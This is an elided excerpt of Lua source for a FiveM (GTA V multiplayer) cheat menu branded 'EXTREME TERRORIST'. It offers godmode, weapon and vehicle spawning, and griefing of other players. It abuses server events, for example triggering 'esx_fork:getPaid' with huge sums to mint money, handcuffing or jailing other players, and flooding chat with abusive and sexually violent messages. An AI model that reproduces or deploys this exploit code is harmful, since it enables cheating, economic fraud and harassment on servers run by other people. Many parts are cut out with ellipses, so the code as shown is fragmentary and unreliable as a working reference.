...
local E = 0.005
local F = 0.005
local G = 'EXTREME TERRORIST'
local function H(I)
    if EXTREME.debug then
        Citizen.Trace('[EXTREME] ' .. tostring(I))
    end
end
...
function EXTREME.CreateMenu(f, a7)
    o[f] = {}
    o[f].title = a7
    o[f].subTitle = G
    o[f].visible = false
...
function EXTREME.CreateSubMenu(f, a9, aa)
    if o[a9] then
        EXTREME.CreateMenu(f, o[a9].title)
        if aa then
            J(f, 'subTitle', aa)
        else
...
function EXTREME.CurrentMenu()
    return t
end

function EXTREME.OpenMenu(f)
    if f and o[f] then
...
function EXTREME.IsMenuOpened(f)
    return L(f)
end

function EXTREME.IsAnyMenuOpened()
...
function EXTREME.IsMenuAboutToBeClosed()
    if o[t] then
...
function EXTREME.MenuButton(I, f)
    if o[f] then
        if EXTREME.Button(I) then
            M(t, false)
            M(f, true, true)
            return true
        end
...
function EXTREME.CheckBox(I, bool, ad)
    local ae = '~r~~h~OFF'
    if bool then
        ae = '~g~~h~ON'
    end
    if EXTREME.Button(I, ae) then
        bool = not bool
...
function EXTREME.ComboBox(I, af, ag, ah, ad)
    local ai = #af
    local aj = af[ag]
...
function EXTREME.SetMenuWidth(f, X)
    J(f, 'width', X)
end

function EXTREME.SetMenuX(f, x)
    J(f, 'x', x)
end

function EXTREME.SetMenuY(f, y)
    J(f, 'y', y)
end

function EXTREME.SetMenuMaxOptionCountOnScreen(f, count)
    J(f, 'maxOptionCount', count)
end

function EXTREME.SetTitleColor(f, r, g, b, ak)
    J(
        f,
        'titleColor',
        {
...
function EXTREME.SetTitleBackgroundColor(f, r, g, b, ak)
    J(
        f,
...
function EXTREME.SetTitleBackgroundSprite(f, al, am)
    J(
        f,
...
function EXTREME.SetSubTitle(f, I)
    J(f, 'subTitle', I)
end

function EXTREME.SetMenuBackgroundColor(f, r, g, b, ak)
    J(
        f,
        'menuBackgroundColor',
        {
...
function EXTREME.SetMenuTextColor(f, r, g, b, ak)
    J(
        f,
        'menuTextColor',
        {
...
function EXTREME.SetMenuSubTextColor(f, r, g, b, ak)
    J(
        f,
        'menuSubTextColor',
        {
...
function EXTREME.SetMenuFocusColor(f, r, g, b, ak)
    J(
        f,
        'menuFocusColor',
        {
...
function EXTREME.SetMenuButtonPressedSound(f, name, an)
    J(
        f,
        'buttonPressedSound',
        {
...
local b7 = {
    Melee = {
        BaseballBat = {
            id = 'weapon_bat',
            name = '~h~~r~> ~w~Baseball Bat',
            bInfAmmo = false,
            mods = {}
        },
        BrokenBottle = {
            id = 'weapon_bottle',
            name = '~h~~r~> ~w~Broken Bottle',
            bInfAmmo = false,
            mods = {}
        },
        Crowbar = {
        ...
        Flashlight = {
            ...
            name = '~h~~r~> ~w~Flashlight',
            bInfAmmo = false,
            mods = {}
        },
        GolfClub = {
            id = 'weapon_golfclub',
            name = '~h~~r~> ~w~Golf Club',
            bInfAmmo = false,
            mods = {}
        },
        BrassKnuckles = {
            id = 'weapon_knuckle',
            name = '~h~~r~> ~w~Brass Knuckles',
            bInfAmmo = false,
            mods = {}
        },
        Knife = {
        ...
        Switchblade = {
            ...
            name = '~h~~r~> ~w~Switchblade',
            bInfAmmo = false,
            mods = {}
        },
        Nightstick = {
            id = 'weapon_nightstick',
            name = '~h~~r~> ~w~Nightstick',
            bInfAmmo = false,
            mods = {}
        },
        BattleAxe = {
            id = 'weapon_battleaxe',
            name = '~h~~r~> ~w~Battle Axe',
            bInfAmmo = false,
            mods = {}
        }
    },
    Handguns = {
        Pistol = {
            ...
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~w~Default Magazine',
                        id = 'COMPONENT_PISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~w~Extended Magazine',
        ...
        PistolMK2 = {
            ...
            mods = {
                ...
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~w~Compensator',
                        id = 'COMPONENT_AT_PI_COMP'
                    },
                    {
                        name = '~h~~r~> ~w~Suppessor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        ...
        FlareGun = {
            id = 'weapon_flaregun',
            name = '~h~~r~> ~w~Flare Gun',
            bInfAmmo = false,
            mods = {}
        },
        MarksmanPistol = {
            id = 'weapon_marksmanpistol',
            name = '~h~~r~> ~w~Marksman Pistol',
            bInfAmmo = false,
            mods = {}
        },
        HeavyRevolver = {
            id = 'weapon_revolver',
            name = '~h~~r~> ~w~Heavy Revolver',
            bInfAmmo = false,
            mods = {}
        },
        HeavyRevolverMkII = {
            id = 'weapon_revolver_mk2',
            name = '~h~~r~> ~w~Heavy Revolver Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~w~Default Rounds',
                ...
                Sights = {
                    {
                        name = '~h~~r~> ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~w~Small Scope',
        ...
        DoubleActionRevolver = {
            ...
            name = '~h~~r~> ~w~Double Action Revolver',
            bInfAmmo = false,
            mods = {}
        },
        UpnAtomizer = {
            id = 'weapon_raypistol',
            name = '~h~~r~> ~w~Up-n-Atomizer',
            bInfAmmo = false,
            mods = {}
        }
    },
        ...
        SMGMkII = {
            ...
            mods = {
                ...
                BarrelAttachments = {
                    ...
                    {
                        name = '~h~~r~> ~w~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~w~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~w~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~w~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~w~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~w~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~w~Split-End Muzzle Brake',
    ...
    Shotguns = {
        ...
        PumpShotgunMkII = {
            ...
            mods = {
                ...
                BarrelAttachments = {
                    ...
                    {
                        name = '~h~~r~> ~w~Squared Muzzle Brake',
        ...
        SawedOffShotgun = {
            ...
            name = '~h~~r~> ~w~Sawed-Off Shotgun',
            bInfAmmo = false,
            mods = {}
        },
        AssaultShotgun = {
            id = 'weapon_assaultshotgun',
            name = '~h~~r~> ~w~Assault Shotgun',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
        ...
        DoubleBarrelShotgun = {
            id = 'weapon_dbshotgun',
            name = '~h~~r~> ~w~Double Barrel Shotgun',
            bInfAmmo = false,
            mods = {}
        },
        SweeperShotgun = {
            id = 'weapon_autoshotgun',
            name = '~h~~r~> ~w~Sweeper Shotgun',
            bInfAmmo = false,
            mods = {}
        }
    },
    AssaultRifles = {
        ...
        AssaultRifleMkII = {
            ...
            name = '~h~~r~> ~w~Assault Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
        ...
        CarbineRifleMkII = {
            ...
            name = '~h~~r~> ~w~Carbine Rifle Mk II ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
        ...
        SpecialCarbineMkII = {
            ...
            name = '~h~~r~> ~w~Special Carbine Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
        ...
        BullpupRifleMkII = {
            ...
            name = '~h~~r~> ~w~Bullpup Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                    ...
                    {
                        name = '~h~~r~> ~w~Armor Piercing Rounds',
    ...
    Snipers = {
        ...
        HeavySniperMkII = {
            ...
            mods = {
                Magazines = {
                    ...
                    {
                        name = '~h~~r~> ~w~Explosive Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~w~Zoom Scope',
                    ...
                    {
                        name = '~h~~r~> ~w~Nigt Vision Scope',
                        id = 'COMPONENT_AT_SCOPE_NV'
                    },
                    {
                        name = '~h~~r~> ~w~Thermal Scope',
                ...
                BarrelAttachments = {
                    ...
                    {
                        name = '~h~~r~> ~w~Bell-End Muzzle Brake',
        ...
        MarksmanRifleMkII = {
            ...
            name = '~h~~r~> ~w~Marksman Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
    ...
    Heavy = {
        ...
        GrenadeLauncher = {
            ...
            name = '~h~~r~> ~w~Grenade Launcher',
            bInfAmmo = false,
            mods = {}
        },
        GrenadeLauncherSmoke = {
            id = 'weapon_grenadelauncher_smoke',
            name = '~h~~r~> ~w~Grenade Launcher Smoke',
            bInfAmmo = false,
            mods = {}
        },
        Minigun = {
        ...
        HomingLauncher = {
            ...
            name = '~h~~r~> ~w~Homing Launcher',
            bInfAmmo = false,
            mods = {}
        },
        CompactGrenadeLauncher = {
            id = 'weapon_compactlauncher',
            name = '~h~~r~> ~w~Compact Grenade Launcher',
            bInfAmmo = false,
            mods = {}
        },
        Widowmaker = {
            id = 'weapon_rayminigun',
            name = '~h~~r~> ~w~Widowmaker',
            bInfAmmo = false,
            mods = {}
        }
    },
    Throwables = {
        ...
        MolotovCocktail = {
            id = 'weapon_molotov',
            name = '~h~~r~> ~w~Molotov Cocktail',
            bInfAmmo = false,
            mods = {}
        },
        StickyBomb = {
            id = 'weapon_stickybomb',
            name = '~h~~r~> ~w~Sticky Bomb',
            bInfAmmo = false,
            mods = {}
        },
        ProximityMines = {
            id = 'weapon_proxmine',
            name = '~h~~r~> ~w~Proximity Mines',
            bInfAmmo = false,
            mods = {}
        },
        Snowballs = {
            id = 'weapon_snowball',
            name = '~h~~r~> ~w~Snowballs',
            bInfAmmo = false,
            mods = {}
        },
        PipeBombs = {
            id = 'weapon_pipebomb',
            name = '~h~~r~> ~w~Pipe Bombs',
            bInfAmmo = false,
            mods = {}
        },
        Baseball = {
    ...
    Misc = {
        Parachute = {
            id = 'gadget_parachute',
            name = '~h~~r~> ~w~Parachute',
            bInfAmmo = false,
            mods = {}
        },
        FireExtinguisher = {
            id = 'weapon_fireextinguisher',
            name = '~h~~r~> ~w~Fire Extinguisher',
            bInfAmmo = false,
            mods = {}
        }
    }
...
av('~h~You Are EXTREME Terrorist NOW', true)
...
local function bE()
    if bC == 3 then
        ...
        local ak = KeyboardInput('Get your password from #EXTREME TERRORIST-announcements', '', 100)
        if ak == bD then
            mhaonn = true
...
function RapeAllFunc()
    for bD = 0, 9 do
        TriggerServerEvent(
            ...
            '^' .. bD .. 'You got raped by EXTREME TERRORIST'
        )
    end
    Citizen.CreateThread(
        function()
...
EXTREME.StartRC = function()
    if DoesEntityExist(EXTREME.Entity) then
        return
    end
    EXTREME.SpawnRC()
    EXTREME.Tablet(true)
    while DoesEntityExist(EXTREME.Entity) and DoesEntityExist(EXTREME.Driver) do
        Citizen.Wait(5)
        local cf = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(EXTREME.Entity), true)
        EXTREME.DrawInstructions(cf)
        EXTREME.HandleKeys(cf)
        if cf <= 3000.0 then
            if not NetworkHasControlOfEntity(EXTREME.Driver) then
                NetworkRequestControlOfEntity(EXTREME.Driver)
            elseif not NetworkHasControlOfEntity(EXTREME.Entity) then
                NetworkRequestControlOfEntity(EXTREME.Entity)
            end
        else
            TaskVehicleTempAction(EXTREME.Driver, EXTREME.Entity, 6, 2500)
        end
    end
end
EXTREME.HandleKeys = function(cf)
    if IsControlJustReleased(0, 47) then
        if IsCamRendering(EXTREME.Camera) then
            EXTREME.ToggleCamera(false)
        else
            EXTREME.ToggleCamera(true)
        end
    end
    if cf <= 3.0 then
    ...
    if cf < 3000.0 then
        if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(EXTREME.Driver, EXTREME.Entity, 9, 1)
        end
        ...
        if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
            TaskVehicleTempAction(EXTREME.Driver, EXTREME.Entity, 22, 1)
        end
        if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(EXTREME.Driver, EXTREME.Entity, 13, 1)
        end
        if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(EXTREME.Driver, EXTREME.Entity, 14, 1)
        end
        if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(EXTREME.Driver, EXTREME.Entity, 30, 100)
        end
        if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
            TaskVehicleTempAction(EXTREME.Driver, EXTREME.Entity, 7, 1)
        end
        if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
            TaskVehicleTempAction(EXTREME.Driver, EXTREME.Entity, 8, 1)
        end
        if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(EXTREME.Driver, EXTREME.Entity, 4, 1)
        end
        if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(EXTREME.Driver, EXTREME.Entity, 5, 1)
        end
        if IsControlJustReleased(0, 168) then
            SetVehicleEngineOn(EXTREME.Entity, not GetIsVehicleEngineRunning(EXTREME.Entity), false, true)
        end
    end
end
EXTREME.DrawInstructions = function(cf)
    local cg = {
        {
            ['label'] = 'Right',
...
EXTREME.SpawnRC = function()
    ...
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        ...
        EXTREME.Entity = CreateVehicle(GetHashKey(cb), co, cp, true)
        while not DoesEntityExist(EXTREME.Entity) do
            Citizen.Wait(5)
        end
        EXTREME.Driver = CreatePed(5, 68070371, co, cp, true)
        SetEntityInvincible(EXTREME.Driver, true)
        SetEntityVisible(EXTREME.Driver, false)
        FreezeEntityPosition(EXTREME.Driver, true)
        SetPedAlertness(EXTREME.Driver, 0.0)
        TaskWarpPedIntoVehicle(EXTREME.Driver, EXTREME.Entity, -1)
        while not IsPedInVehicle(EXTREME.Driver, EXTREME.Entity) do
            Citizen.Wait(0)
        end
        EXTREME.Attach('place')
        av('~g~~h~Success', false)
    else
        av('~w~~h~Model is not valid !', true)
    end
end
EXTREME.Attach = function(aw)
    if not DoesEntityExist(EXTREME.Entity) then
        return
    end
    EXTREME.LoadModels(
        {
    ...
    if aw == 'place' then
        ...
        Citizen.Wait(200)
        DetachEntity(EXTREME.Entity, false, true)
        PlaceObjectOnGroundProperly(EXTREME.Entity)
    elseif aw == 'pick' then
        if DoesCamExist(EXTREME.Camera) then
            EXTREME.ToggleCamera(false)
        end
        EXTREME.Tablet(false)
        Citizen.Wait(100)
        DetachEntity(EXTREME.Entity)
        DeleteVehicle(EXTREME.Entity)
        DeleteEntity(EXTREME.Driver)
        EXTREME.UnloadModels()
    end
end
EXTREME.Tablet = function(cq)
    if cq then
        EXTREME.LoadModels(
            {
        ...
        Citizen.CreateThread(
            function()
                while DoesEntityExist(EXTREME.TabletEntity) do
                    Citizen.Wait(5)
                    if
        ...
        DeleteEntity(EXTREME.TabletEntity)
    end
end
EXTREME.ToggleCamera = function(cq)
    if not true then
        return
    end
    if cq then
        ...
        if DoesCamExist(EXTREME.Camera) then
            DestroyCam(EXTREME.Camera)
        end
        EXTREME.Camera = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
        AttachCamToEntity(EXTREME.Camera, EXTREME.Entity, 0.0, 0.0, 0.4, true)
        Citizen.CreateThread(
            function()
                while DoesCamExist(EXTREME.Camera) do
                    Citizen.Wait(5)
                    SetCamRot(EXTREME.Camera, GetEntityRotation(EXTREME.Entity))
                end
            end
        )
        local cr =
            500 *
            math.ceil(
                GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(EXTREME.Entity), true) / 10
            )
...
EXTREME.LoadModels = function(cs)
    for ct = 1, #cs do
        local bB = cs[ct]
        if not EXTREME.CachedModels then
            EXTREME.CachedModels = {}
        end
        table.insert(EXTREME.CachedModels, bB)
...
EXTREME.UnloadModels = function()
    for ct = 1, #EXTREME.CachedModels do
        local bB = EXTREME.CachedModels[ct]
        if IsModelValid(bB) then
            ...
            function automaticmoneyesx()
                ...
                if cO then
                    if m ~= '' then
						...
						TriggerServerEvent('esx_fork:getPaid', m)
            ...
            function esxdestroyv2()
                Citizen.CreateThread(
                    function()
						...
						TriggerServerEvent('esx_fork:getPaid', 9999999999)
                        for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                '^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y',
...
Citizen.CreateThread(
    function()
        ...
        EXTREME.CreateMenu('EXTREME-T', bs)
        EXTREME.SetSubTitle('EXTREME-T', 'EXTREME TERRORIST')
        EXTREME.CreateSubMenu('SelfMenu', 'EXTREME-T', 'Self Menu')
        EXTREME.CreateSubMenu('TeleportMenu', 'EXTREME-T', 'Teleport Menu')
        EXTREME.CreateSubMenu('WeaponMenu', 'EXTREME-T', 'Weapon Menu')
        EXTREME.CreateSubMenu('AdvM', 'EXTREME-T', 'Advanced Menu')
        EXTREME.CreateSubMenu('LuaMenu', 'EXTREME-T', 'Lua Menu')
        EXTREME.CreateSubMenu('VehicleMenu', 'EXTREME-T', 'Vehicle Menu')
        EXTREME.CreateSubMenu('OnlinePlayerMenu', 'EXTREME-T', 'Online Player Menu')
        EXTREME.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
        EXTREME.CreateSubMenu('Destroyer', 'AdvM', 'Destroyer Menu')
        EXTREME.CreateSubMenu('ESXBoss', 'LuaMenu', 'ESX Boss Triggers')
        EXTREME.CreateSubMenu('ESXMoney', 'LuaMenu', 'ESX Money Triggers')
        EXTREME.CreateSubMenu('ESXDrugs', 'LuaMenu', 'ESX Drugs')
        EXTREME.CreateSubMenu('ESXCustom', 'LuaMenu', 'ESX Random Triggers')
        EXTREME.CreateSubMenu('VRPTriggers', 'LuaMenu', 'VRP Triggers')
        EXTREME.CreateSubMenu('MiscTriggers', 'LuaMenu', 'Misc Triggers')
        EXTREME.CreateSubMenu('crds', 'EXTREME-T', 'Credits')
        EXTREME.CreateSubMenu('ESXJobs', 'LuaMenu', 'ESX Jobs')
        EXTREME.CreateSubMenu('ESXJobs2', 'PlayerOptionsMenu', 'ESX Jobs Individual')
        EXTREME.CreateSubMenu('ESXTriggerini', 'PlayerOptionsMenu', 'ESX Triggers')
        EXTREME.CreateSubMenu('Trollmenu', 'PlayerOptionsMenu', 'Troll Menu')
        EXTREME.CreateSubMenu('WeaponTypes', 'WeaponMenu', 'Weapons')
        EXTREME.CreateSubMenu('WeaponTypeSelection', 'WeaponTypes', 'Weapon')
        EXTREME.CreateSubMenu('WeaponOptions', 'WeaponTypeSelection', 'Weapon Options')
        EXTREME.CreateSubMenu('ModSelect', 'WeaponOptions', 'Weapon Mod Options')
        EXTREME.CreateSubMenu('CarTypes', 'VehicleMenu', 'Vehicles')
        EXTREME.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Moew :3')
        EXTREME.CreateSubMenu('CarOptions', 'CarTypeSelection', 'Car Options')
        EXTREME.CreateSubMenu('MainTrailer', 'VehicleMenu', 'Trailers to Attach')
        EXTREME.CreateSubMenu('MainTrailerSel', 'MainTrailer', 'Trailers Available')
        EXTREME.CreateSubMenu('MainTrailerSpa', 'MainTrailerSel', 'Trailer Options')
        EXTREME.CreateSubMenu('GiveSingleWeaponPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
        EXTREME.CreateSubMenu('ESPMenu', 'AdvM', 'ESP Menu')
        EXTREME.CreateSubMenu('LSC', 'VehicleMenu', 'LSC Customs')
        EXTREME.CreateSubMenu('tunings', 'LSC', 'Visual Tuning')
        EXTREME.CreateSubMenu('performance', 'LSC', 'Performance Tuning')
        EXTREME.CreateSubMenu('VRPPlayerTriggers', 'PlayerOptionsMenu', 'VRP Triggers')
        EXTREME.CreateSubMenu('BoostMenu', 'VehicleMenu', 'Vehicle Boost')
        EXTREME.CreateSubMenu('SpawnPeds', 'Trollmenu', 'Spawn Peds')
        EXTREME.CreateSubMenu('GCT', 'VehicleMenu', 'Global Car Trolls')
        EXTREME.CreateSubMenu('CsMenu', 'AdvM', 'Crosshairs')
        for i, dE in pairs(bl) do
            EXTREME.CreateSubMenu(dE.id, 'tunings', dE.name)
            if dE.id == 'paint' then
                EXTREME.CreateSubMenu('primary', dE.id, 'Primary Paint')
                EXTREME.CreateSubMenu('secondary', dE.id, 'Secondary Paint')
                EXTREME.CreateSubMenu('rimpaint', dE.id, 'Wheel Paint')
                EXTREME.CreateSubMenu('classic1', 'primary', 'Classic Paint')
                EXTREME.CreateSubMenu('metallic1', 'primary', 'Metallic Paint')
                EXTREME.CreateSubMenu('matte1', 'primary', 'Matte Paint')
                EXTREME.CreateSubMenu('metal1', 'primary', 'Metal Paint')
                EXTREME.CreateSubMenu('classic2', 'secondary', 'Classic Paint')
                EXTREME.CreateSubMenu('metallic2', 'secondary', 'Metallic Paint')
                EXTREME.CreateSubMenu('matte2', 'secondary', 'Matte Paint')
                EXTREME.CreateSubMenu('metal2', 'secondary', 'Metal Paint')
                EXTREME.CreateSubMenu('classic3', 'rimpaint', 'Classic Paint')
                EXTREME.CreateSubMenu('metallic3', 'rimpaint', 'Metallic Paint')
                EXTREME.CreateSubMenu('matte3', 'rimpaint', 'Matte Paint')
                EXTREME.CreateSubMenu('metal3', 'rimpaint', 'Metal Paint')
            end
        end
        for i, dE in pairs(bm) do
            EXTREME.CreateSubMenu(dE.id, 'performance', dE.name)
        end
        ...
        while bw do
            ...
            for i, dE in pairs(bl) do
                if EXTREME.IsMenuOpened('tunings') then
                    if bg then
                        if bi == 'neon' then
                ...
                if EXTREME.IsMenuOpened(dE.id) then
                    if dE.id == 'wheeltypes' then
                        if EXTREME.Button('Sport Wheels') then
                            SetVehicleWheelType(veh, 0)
                        elseif EXTREME.Button('Muscle Wheels') then
                            SetVehicleWheelType(veh, 1)
                        elseif EXTREME.Button('Lowrider Wheels') then
                            SetVehicleWheelType(veh, 2)
                        elseif EXTREME.Button('SUV Wheels') then
                            SetVehicleWheelType(veh, 3)
                        elseif EXTREME.Button('Offroad Wheels') then
                            SetVehicleWheelType(veh, 4)
                        elseif EXTREME.Button('Tuner Wheels') then
                            SetVehicleWheelType(veh, 5)
                        elseif EXTREME.Button('High End Wheels') then
                    ...
                    elseif dE.id == 'headlight' then
                        ...
                        for dK, dE in pairs(bo) do
                            ...
                            if EXTREME.Button(dE.name, pricetext) then
                                if not bg then
                                    bi = 'headlight'
                                    bk = false
                    ...
                    elseif dE.id == 'neon' then
                        ...
                        for i, dE in pairs(bq) do
                            ...
                            if EXTREME.Button(i, pricestring) then
                                if not bg then
                                    bi = 'neon'
                    ...
                    elseif dE.id == 'paint' then
                        if EXTREME.MenuButton('~h~~r~#~w~ Primary Paint', 'primary') then
                        elseif EXTREME.MenuButton('~h~~r~#~w~ Secondary Paint', 'secondary') then
                        elseif EXTREME.MenuButton('~h~~r~#~w~ Wheel Paint', 'rimpaint') then
                        end
                        EXTREME.Display()
                    else
                        ...
                        for i, dL in pairs(az) do
                            ...
                            if EXTREME.Button(dL.menuName) then
                                if not bg then
                                    bi = dE.id
            ...
            for i, dE in pairs(bm) do
                if EXTREME.IsMenuOpened(dE.id) then
                    ...
                    if EXTREME.Button('Stock ' .. dE.name, pricestock) then
                        SetVehicleMod(veh, dE.id, -1)
                    elseif EXTREME.Button(dE.name .. ' Upgrade 1', price1) then
                        SetVehicleMod(veh, dE.id, 0)
                    elseif EXTREME.Button(dE.name .. ' Upgrade 2', price2) then
                        SetVehicleMod(veh, dE.id, 1)
                    elseif EXTREME.Button(dE.name .. ' Upgrade 3', price3) then
                        SetVehicleMod(veh, dE.id, 2)
                    elseif dE.id ~= 13 and dE.id ~= 12 and EXTREME.Button(dE.name .. ' Upgrade 4', price4) then
                        SetVehicleMod(veh, dE.id, 3)
                    end
                    EXTREME.Display()
                end
            end
            if EXTREME.IsMenuOpened('EXTREME-T') then
                local dQ = PlayerId(-1)
                local bH = GetPlayerName(dQ)
                av('You Are Going EXTREME', false)
                av('You Are EXTREME Terrorist NOW', false)
                if EXTREME.MenuButton('~h~~r~--->~w~ MY PLAYER ~o~~h~:D', 'SelfMenu') then
                elseif EXTREME.MenuButton('~h~~r~--->~w~ OTHER PLAYERS ~o~~h~:D', 'OnlinePlayerMenu') then
				elseif EXTREME.MenuButton('~h~~r~--->~w~ CARS OPTIONS ~o~~h~:D', 'VehicleMenu') then
                elseif EXTREME.MenuButton('~h~~r~--->~w~ TELEPORT OPTIONS ~o~~h~:D', 'TeleportMenu') then
                elseif EXTREME.MenuButton('~h~~r~--->~w~ GUNS OPTIONS ~o~~h~:D', 'WeaponMenu') then
                elseif EXTREME.MenuButton('~h~~r~--->~w~ OTHER OPTIONS ~o~~h~:D', 'AdvM') then
				elseif EXTREME.MenuButton('~h~~r~--->~w~ LUA EXCUTER ~o~~h~:D', 'LuaMenu') then
                elseif EXTREME.MenuButton('~h~~r~--->~w~ ~y~EXTREME TERRORIST ~o~~h~xD', 'crds') then
                end
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('SelfMenu') then
                if
                    EXTREME.CheckBox(
                        '~h~~g~Godmode',
                        Godmode,
                 ...
                 then
                elseif EXTREME.Button('~h~~y~Semi ~g~Godmode') then
                ...
                elseif
                 ...
                 then
                elseif EXTREME.Button('~h~~r~Suicide') then
                    SetEntityHealth(PlayerPedId(-1), 0)
                elseif EXTREME.Button('~h~~g~ESX~w~ Revive Yourself~w~') then
                    TriggerEvent('esx_ambulancejob:revive')
                elseif EXTREME.Button('~h~~g~Heal/Revive') then
                    SetEntityHealth(PlayerPedId(-1), 200)
                elseif EXTREME.Button('~h~~w~Give Armour') then
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('OnlinePlayerMenu') then
                for i = 0, 128 do
                    if
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('PlayerOptionsMenu') then
                EXTREME.SetSubTitle('PlayerOptionsMenu', 'Player Options [' .. GetPlayerName(SelectedPlayer) .. ']')
                if EXTREME.MenuButton('~h~~r~#~w~ ESX Triggers', 'ESXTriggerini') then
                elseif EXTREME.MenuButton('~h~~r~#~w~ ESX Jobs', 'ESXJobs2') then
                elseif EXTREME.MenuButton('~h~~r~#~w~ VRP Triggers', 'VRPPlayerTriggers') then
                elseif EXTREME.MenuButton('~h~~r~#~w~ Troll Menu', 'Trollmenu') then
                elseif EXTREME.Button('~h~Spectate', cC and '~g~[SPECTATING]') then
                    SpectatePlayer(SelectedPlayer)
                elseif EXTREME.Button('~h~~r~Semi GOD ~w~Player') then
                    local dS = 'stt_prop_stunt_soccer_ball'
                    while not HasModelLoaded(GetHashKey(dS)) do
                        Citizen.Wait(0)
                        RequestModel(GetHashKey(dS))
                ...
                elseif EXTREME.Button('~h~Teleport To') then
                    if cO then
                        local confirm = KeyboardInput('Are you sure? y/n', '', 0)
                        if confirm == 'y' then
                            local Entity =
                ...
                elseif
                 ...
                 then
                elseif EXTREME.MenuButton('~h~~r~#~w~ Give Single Weapon', 'GiveSingleWeaponPlayer') then
                elseif EXTREME.Button('~h~Give ~r~All Weapons') then
                    for i = 1, #b6 do
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(b6[i]), 1000, false, false)
                    end
                elseif EXTREME.Button('~h~Remove ~r~All Weapons') then
                    RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true)
                elseif EXTREME.Button('~h~Give ~r~Vehicle') then
                ...
                elseif EXTREME.Button('~h~Send To ~r~Jail') then
                ...
                elseif EXTREME.Button('~h~~g~Evade ~w~From Jail') then
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('ESXTriggerini') then
                if EXTREME.Button("~w~Open Inventory") then
				TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
				elseif EXTREME.Button('~h~~g~Revive Player') then
                    ...
                    DoScreenFadeIn(800)
                elseif EXTREME.Button('~h~~g~Give money to player from your wallet') then
                ...
                elseif EXTREME.Button('~h~~w~Handcuff Player') then
                    TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
                end
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('VRPPlayerTriggers') then
                if EXTREME.Button('~h~Transfer money from your bank') then
            ...
            elseif EXTREME.IsMenuOpened('ESXJobs2') then
                ...
                elseif EXTREME.Button('~h~Set ~r~Car ~w~Dealer ~w~Job') then
                    TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'cardealer', 3)
                    CarDealerPlayer(SelectedPlayer)
                end
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('Trollmenu') then
                if EXTREME.MenuButton('~h~~r~#~w~ Spawn Peds', 'SpawnPeds') then
                elseif EXTREME.Button('~h~~r~Fake ~w~Chat Message') then
                ...
                elseif EXTREME.Button('~h~~r~Kick ~w~From Vehicle') then
                    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                elseif EXTREME.Button('~h~~y~Explode ~w~Vehicle') then
                ...
                elseif EXTREME.Button('~h~~r~Launch ~w~his car') then
                ...
                elseif EXTREME.Button('~h~~r~Banana ~r~Party') then
                    local bH = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
                    local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
                    local bJ = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
